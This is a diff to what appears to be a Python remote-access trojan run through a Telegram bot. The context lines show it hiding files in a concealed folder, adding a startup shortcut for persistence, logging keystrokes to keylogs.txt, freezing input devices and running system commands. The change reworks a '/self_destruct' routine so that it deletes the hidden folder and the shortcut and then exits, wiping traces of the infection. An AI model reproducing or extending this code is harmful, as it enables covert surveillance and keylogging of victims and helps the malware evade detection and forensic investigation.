@@ -44,7 +44,7 @@ if not os.path.exists(hide_folder):
 	shortcut.Targetpath = hide_compiled
 	shortcut.WorkingDirectory = hide_folder
 	shortcut.save()
-initi = False
+destroy = False
 keyboardFrozen = False
 mouseFrozen = False
 user = os.environ.get("USERNAME")	# Windows username to append keylogs.txt
@@ -359,22 +359,16 @@ def handle(msg):
 					runStackedSchedule(10)
 			elif command == '/self_destruct':
 				bot.sendChatAction(chat_id, 'typing')
-				global initi
-				initi = True
-				response = 'You sure? Type \'destroy!\' to proceed.'
-			elif command == 'destroy!' and initi == True:
+				global destroy
+				destroy = True
+				response = 'You sure? Type \'/destroy\' to proceed.'
+			elif command == '/destroy' and destroy == True:
 				bot.sendChatAction(chat_id, 'typing')
-				response = 'Destroying all traces!'
 				if os.path.exists(hide_folder):
-					for file in os.listdir(hide_folder):
-						try:
-							os.remove(hide_folder + '\\' + file)
-						except:
-							pass
+					rmtree(hide_folder)
 				if os.path.isfile(target_shortcut):
 					os.remove(target_shortcut)
-				while True:
-					sleep(10)
+				os._exit(0)
 			elif command == '/tasklist':
 				lines = os.popen('tasklist /FI \"STATUS ne NOT RESPONDING\"')
 				response2 = ''
